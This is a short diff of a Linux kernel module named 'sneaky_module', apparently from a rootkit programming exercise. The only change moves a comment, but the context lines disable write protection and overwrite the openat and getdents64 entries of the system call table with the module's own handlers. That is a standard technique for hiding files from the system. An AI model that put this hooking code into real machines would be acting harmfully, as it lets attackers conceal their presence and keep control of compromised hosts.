@@ -114,9 +114,9 @@ static int initialize_sneaky_module(void)
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
+  //  You need to replace other system calls you need to hack here
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
-  //  You need to replace other system calls you need to hack here
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
